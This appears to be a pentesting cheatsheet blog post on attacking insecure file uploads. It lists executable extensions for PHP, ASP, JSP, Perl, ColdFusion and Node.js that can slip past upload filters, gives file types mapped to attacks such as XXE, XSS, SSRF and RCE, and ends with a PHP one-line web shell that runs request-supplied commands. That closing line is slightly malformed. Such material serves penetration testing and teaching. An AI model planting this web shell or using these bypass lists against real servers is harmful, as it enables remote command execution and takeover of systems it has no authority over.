---
layout: post
title:  "Cheatsheet - File Upload"
description: Any Needs for Insecure File Upload
tags: Cheatsheet Web-Application
---

Guide to handle **File Upload** in **Web Application**

## Default Extensions

- PHP

    ```bash
    .php
    .php2
    .php3
    .php4
    .php5
    .php6
    .php7
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
    .shtml
    .htaccess
    ```
    {: file='PHP Extension'}

- ASP

    ```bash
    .asp
    .aspx
    .config
    .ashx
    .asmx
    .aspq
    .aspq
    .axd
    .cshtm
    .cshtml
    .rem
    .vbhtm
    .vbhtml
    .shtml
    .cer
    .asa
    .aspx;1.jpg
    .soap
    ```
    {: file='ASP Extension'}

- JSP

    ```bash
    .jsp
    .jspx
    .jsw
    .jsv
    .jspf
    .wss
    .do
    .actions
    ```
    {: file='JSP Extension'}

- Perl

    ```bash
    .pl
    .pm
    .cgi
    .lib
    ```
    {: file='Perl Extension'}

- Coldfusion

    ```bash
    .cfm
    .cfml
    .cfc
    .dbm
    ```
    {: file='Coldfusion Extension'}

- Node.js

    ```bash
    .js
    .json
    .node
    ```
    {: file='Node.js Extension'}

## Other Vulnerability Extension

```bash
.svg # XXE, XSS, SSRF
.gif # XSS
.csv # CSV Injection
.xml # XXE
.avi # LFI, SSRF
.js # XSS, Open Redirect
.zip # RCE, DOS, LFI
.html # XSS, Open Redirect
```
{: file='Other Vulnerability Extension'}

## One Liner

- PHP

    ```php
    <?php system($_REQUEST['cmd']); php>
    ```
